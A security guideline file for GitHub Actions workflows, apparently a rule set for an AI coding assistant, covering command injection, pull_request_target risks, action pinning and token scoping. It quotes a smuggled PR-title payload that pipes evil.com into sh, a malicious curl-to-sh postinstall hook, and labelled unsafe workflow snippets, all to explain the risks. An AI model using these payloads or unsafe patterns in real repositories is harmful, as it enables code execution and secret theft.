---
source: stacks/github-actions
name: workflow-security
description: Security-focused rules for GitHub Actions workflows — pull_request_target pitfalls, injection from untrusted input, action pinning, OIDC setup, GITHUB_TOKEN scoping. Load when authoring or reviewing .github/workflows/*.yml.
triggers: pull_request_target, actions pinning, oidc, github_token, workflow permissions, injection, workflow security, shellcheck actions, unsafe workflow
globs: [".github/workflows/*.yml", ".github/workflows/*.yaml", ".github/workflows/**/*.yml"]
---

# Workflow security

GitHub Actions workflows run with privileged tokens, often have cloud
credentials, and process untrusted data (PR titles, issue bodies,
commit messages). Treat them like services exposed to the internet —
because they functionally are.

## The attacker model

Assume an attacker can:

- Open a PR from a fork with malicious content.
- Edit issue / PR titles, bodies, commit messages, branch names.
- Contribute changes that modify `.github/workflows/*.yml`.
- Trigger workflows with `workflow_dispatch` inputs they control (on public repos).

A secure workflow renders all of these safe.

## Injection — the `${{ ... }}` trap

When you write `${{ github.event.pull_request.title }}` in a `run:`
step, GitHub *substitutes* the value into the shell script **before**
the shell parses it. A PR title of `"; curl evil.com | sh; echo "` becomes
executable code.

```yaml
# UNSAFE
- run: echo "PR title: ${{ github.event.pull_request.title }}"

# SAFE
- env:
    TITLE: ${{ github.event.pull_request.title }}
  run: echo "PR title: $TITLE"
```

The `env:` pattern quotes via the shell, which handles escaping. Rule: **never interpolate `github.event.*` fields directly into `run:` or shell commands.** Always route through `env:`.

Context fields that carry attacker-controlled data (on open repos):

- `github.event.pull_request.title`
- `github.event.pull_request.body`
- `github.event.pull_request.head.ref` (branch name)
- `github.event.issue.title` / `.body`
- `github.event.comment.body`
- `github.event.head_commit.message` / `author.name` / `author.email`
- `github.event.workflow_run.head_branch`

Also context:
- `github.event.inputs.*` for `workflow_dispatch` — if your repo is public, strangers can't trigger it, but teammates typing inputs is still untrusted-ish.

## `pull_request_target` — the feature that bites

| Trigger | Runs as | Has secrets? | Has write GITHUB_TOKEN? |
|---|---|---|---|
| `pull_request` | PR's code | No (for fork PRs) | No |
| `pull_request_target` | **Base branch's code** | **Yes** | **Yes** |

`pull_request_target` exists to allow labeling PRs, auto-assigning
reviewers, etc. from fork PRs. It is **not** for running tests on
fork PR code.

**The dangerous pattern:**

```yaml
# NEVER DO THIS
on: pull_request_target
jobs:
  test:
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.sha }}   # checks out the PR's code
      - run: npm install                                    # runs their code with your secrets
```

An attacker opens a PR adding `"postinstall": "curl ... | sh"` to
`package.json`, and your secrets — including cloud credentials —
exfiltrate on the next run.

**If you must use `pull_request_target`**, do not check out PR code;
and if you must, don't run it.

## Action pinning

```yaml
# BAD — tag can be moved by the action author
- uses: some-org/some-action@v2

# BETTER — tag pinned to a specific commit (Dependabot updates this)
- uses: some-org/some-action@abcdef1234567890abcdef1234567890abcdef12 # v2.3.4

# FIRST-PARTY — tag is acceptable for actions/*, github/*
- uses: actions/checkout@v4
```

Policy:

- **Third-party actions**: pin to SHA. Review the action source at that SHA before adopting.
- **First-party** (`actions/*`, `github/*`, `aws-actions/*`, `azure/*`, `google-github-actions/*` — organization-vetted): tag pinning is acceptable.
- **Dependabot** is configured for `package-ecosystem: github-actions` — keeps SHA pins up to date.

Allowlist third-party actions at the organization level if you can (Settings → Actions → Allow select actions).

## `GITHUB_TOKEN` scoping

The default `GITHUB_TOKEN` permissions depend on org/repo settings. **Explicitly scope per workflow and per job**, even if defaults seem fine:

```yaml
permissions: {}            # workflow default: no permissions

jobs:
  test:
    permissions:
      contents: read       # read code
  lint-pr:
    permissions:
      contents: read
      pull-requests: write # comment on the PR
  release:
    permissions:
      contents: write      # create releases + tags
      packages: write      # publish packages
```

Scopes: `actions`, `checks`, `contents`, `deployments`, `discussions`, `id-token`, `issues`, `packages`, `pages`, `pull-requests`, `repository-projects`, `security-events`, `statuses`.

## OIDC cloud trust configuration

Configure the cloud-side role with claim-based conditions:

### AWS (trust policy)

```json
{
  "Effect": "Allow",
  "Principal": { "Federated": "arn:aws:iam::ACCOUNT:oidc-provider/token.actions.githubusercontent.com" },
  "Action": "sts:AssumeRoleWithWebIdentity",
  "Condition": {
    "StringEquals": {
      "token.actions.githubusercontent.com:aud": "sts.amazonaws.com",
      "token.actions.githubusercontent.com:sub": "repo:myorg/myrepo:environment:production"
    }
  }
}
```

- `sub` claim can be pinned to:
  - `repo:org/name:ref:refs/heads/main` (specific branch)
  - `repo:org/name:environment:production` (specific environment — recommended; pairs with environment protection rules)
  - `repo:org/name:pull_request` (PR context)
- **Never grant to `repo:org/*:*` or `repo:*:*`** — any repo could assume your role.

### GCP (Workload Identity Federation)

Similar — pin `attribute.repository` and `attribute.ref` in the workload identity pool's attribute condition.

### Azure

Federated credentials per repo+branch / repo+environment.

## `workflow_run` — downstream trigger safety

```yaml
on:
  workflow_run:
    workflows: [CI]
    types: [completed]
```

`workflow_run` runs in the context of the *base branch*, with access to secrets. It's safer than `pull_request_target` for "run after CI succeeded on a fork PR" patterns, but still requires care:

- Still don't run untrusted PR code.
- Download and inspect artifacts from the source workflow with caution.
- Use for posting results, gating downstream deploys — not for running tests that should have run in `pull_request`.

## Composite actions + reusable workflows — trust boundaries

- **Composite actions** (`uses: ./.github/actions/foo`) in your own repo run in your workflow's trust context. Review them like any internal code.
- **Reusable workflows** (`uses: ./.github/workflows/_deploy.yml@<sha>`) from other repos can be pinned by SHA; trust model same as third-party actions.
- **Inputs to reusable workflows** can be interpolated dangerously too — sanitize the same way.

## Secrets — discipline

- **Don't `echo` secrets.** GitHub redacts literal matches, but:
  - Base64 / hex / URL-encoded versions slip through.
  - Secrets substring-matching another string are partially redacted unpredictably.
  - Secrets in log group names / titles / step summaries may not redact.
- **Don't pass secrets as inputs** to reusable workflows unnecessarily. Use `secrets: inherit` cautiously — it gives the called workflow access to all your secrets.
- **Environment secrets** (not repo secrets) for anything sensitive. Pair with environment protection rules.

## Step-level safety

- **`timeout-minutes:`** on every job. Default is 360 (6 hours). Usually set to 10-20 for CI, 60 for deploys.
- **`continue-on-error: true`** hides failures — use only for genuinely optional steps (e.g., uploading metrics on a PR).
- **`shell: bash`** explicit for consistency; `set -euo pipefail` in scripts (or use `run: |` with the shell specified).

## Logging + output handling

- **`::add-mask::`** to mask tokens computed mid-workflow (not just secrets).
- **Step summaries** (`$GITHUB_STEP_SUMMARY`) — rich Markdown, PR-attached, but: any content written there is visible to anyone with read access. Don't dump secrets, internal URLs, etc.
- **Artifacts** — uploaded artifacts are downloadable by anyone with repo read. Scrub before upload if the artifact contains potentially sensitive data.

## Review checklist for any workflow change

- [ ] No `pull_request_target` running PR code.
- [ ] No `${{ github.event.* }}` interpolated into `run:` — routed through `env:`.
- [ ] All third-party actions SHA-pinned.
- [ ] `permissions:` explicit per workflow + per job.
- [ ] OIDC (or equivalent federated auth) instead of long-lived cloud keys.
- [ ] Cloud-side trust policies scoped to specific repo + branch/environment.
- [ ] `timeout-minutes` set on each job.
- [ ] No `echo`-ing of secrets in any form.
- [ ] `concurrency` set for non-deploy workflows to prevent duplicate runs.
- [ ] Deploy workflows gated behind environments with required reviewers.
